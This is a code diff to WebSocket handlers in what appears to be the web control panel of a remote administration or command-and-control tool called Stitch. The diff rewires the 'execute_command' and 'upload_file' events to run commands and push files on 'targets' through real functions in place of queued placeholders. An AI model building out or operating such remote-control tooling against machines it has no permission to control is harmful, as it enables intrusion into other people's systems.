@@ -71,7 +71,7 @@ def register_strategic_websocket_events(socketio, logger):
     
     @socketio.on('execute_command')
     def handle_execute_command(data):
-        """Execute command on target"""
+        """Execute command on target using real Stitch system"""
         try:
             target_id = data.get('target_id')
             command = data.get('command')
@@ -81,13 +81,16 @@ def register_strategic_websocket_events(socketio, logger):
                 emit('error', {'error': 'Missing target_id or command'})
                 return
             
-            # Execute command
-            command_id = strategic_center.execute_command(target_id, command, parameters)
+            # Execute command using real Stitch system
+            from web_app_real import execute_real_command
+            result = execute_real_command(command, target_id, parameters)
             
-            emit('command_queued', {
-                'command_id': command_id,
+            # Emit result immediately
+            emit('command_result', {
                 'target_id': target_id,
                 'command': command,
+                'success': True,
+                'output': result,
                 'timestamp': time.time()
             })
             
@@ -123,7 +126,7 @@ def register_strategic_websocket_events(socketio, logger):
     
     @socketio.on('upload_file')
     def handle_upload_file(data):
-        """Upload file to target"""
+        """Upload file to target using real Stitch system"""
         try:
             target_id = data.get('target_id')
             filename = data.get('filename')
@@ -138,16 +141,25 @@ def register_strategic_websocket_events(socketio, logger):
             import base64
             file_data = base64.b64decode(content)
             
-            # Upload file
-            operation_id = strategic_center.upload_file(target_id, filename, file_data, path)
+            # Upload file using real Stitch system
+            from web_app_real import upload_file_to_target
+            result = upload_file_to_target(target_id, filename, file_data, path)
             
-            emit('file_upload_queued', {
-                'operation_id': operation_id,
-                'target_id': target_id,
-                'filename': filename,
-                'path': path,
-                'timestamp': time.time()
-            })
+            if result.get('success'):
+                emit('file_upload_success', {
+                    'target_id': target_id,
+                    'filename': filename,
+                    'path': path,
+                    'message': result.get('message', 'File uploaded successfully'),
+                    'timestamp': time.time()
+                })
+            else:
+                emit('file_upload_error', {
+                    'target_id': target_id,
+                    'filename': filename,
+                    'error': result.get('error', 'Upload failed'),
+                    'timestamp': time.time()
+                })
             
         except Exception as e:
             logger.error(f"Upload file error: {e}")
